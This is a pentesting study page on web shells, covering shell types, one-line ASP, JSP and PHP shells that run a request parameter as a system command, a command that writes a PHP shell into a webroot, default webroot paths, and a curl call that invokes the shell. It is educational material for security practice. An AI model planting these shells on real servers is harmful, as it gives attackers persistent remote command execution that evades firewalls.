---
title: Web Shells
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - webshell
  - reverse-shells
---

# Web shells

??? abstract "All about shells"
    | **Shell Type** | **Description** |
    | ------- | -------- |
    | [`Reverse shell`](reverse-shells.md) | Initiates a connection back to a "listener" on our attack box.  |
    | [`Bind shell`](bind-shells.md)       | "Binds" to a specific port on the target host and waits for a connection from our attack box.  |
    | [`Web shell`](web-shells.md)         | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |


!!! example "Preconfigured webshells in Kali linux"
    Go to /usr/share/webshells/

??? abstract "Other resources"
    See [reverse shells](reverse-shells.md)


A Web Shell is typically a web script that accepts our command through HTTP request parameters, executes our command, and prints its output back on the web page.

A web shell script is typically a one-liner that is very short and can be memorized easily.


## Some basic web shells

### asp

```asp
<% eval request("cmd") %>
```


### jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### php

```php
<?php system($_REQUEST["cmd"]); ?>
```

- [Pentesmonkey webshell](pentesmonkey.md).
- [WhiteWinterWolf webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php).

## How to exploit a web shell

### File upload vs Remote code execution

**1.** **FILE UPLOAD: By abusing an upload feature.** We would place this web shell script into the remote host's web directory to execute the script through the web browser.

**2.** **REMOTE CODE EXECUTION: By writting our one-liner shell to the webroot to access it over the web**. This would be if onle have remote command execution as a exploit vector. Here an example for bash:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

So, for the second way of exploitation, it's relevant to identify where the webroot is. The following are the default webroots for common web servers:

| Web Server | Default Webroot |
| ------------ | ----------------- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ | 
| XAMPP | C:\xampp\htdocs\ | 

### Accessing the web shell

We can access to the web shell using the browser. Or Curl:

```shell-session
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

A  benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. 


## Tools

[About webshells](https://github.com/BlackArch/webshells).

[Laudanum](laudanum.md)

[nishang](nishang.md)
